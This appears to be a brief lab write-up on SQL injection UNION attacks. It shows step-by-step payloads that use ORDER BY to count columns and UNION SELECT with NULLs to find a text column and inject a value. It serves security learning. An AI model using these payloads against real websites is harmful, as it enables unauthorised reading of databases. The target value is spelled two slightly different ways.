
### SQL injection UNION attack, finding a column containing text : PRACTITIONER

---

> Get the number of columns using the `order by` technique. Keep increasing order by index until an error is produced.
```
...category=Accessories' ORDER BY 4
```
> Number of columns is 3

> To check which column of the three has type string use this payload with 3 NULLs for the 3 columns.
```
' UNION SELECT NULL, NULL, NULL--
```
> Switch each one with a string and try. Errors mean that they are not the correct data type.

> The second column is of type string as the website returns a response that isn't an error. The payload used:
```
' UNION SELECT NULL, 'a', NULL --
```

> Now we know which column is text. We need to retrieve the value `EoNl2q` from the database.
> So we modify the above query to be:
```
' UNION SELECT NULL, 'EoNI2q', NULL --
```


> An extra row is output with the wanted data.

---
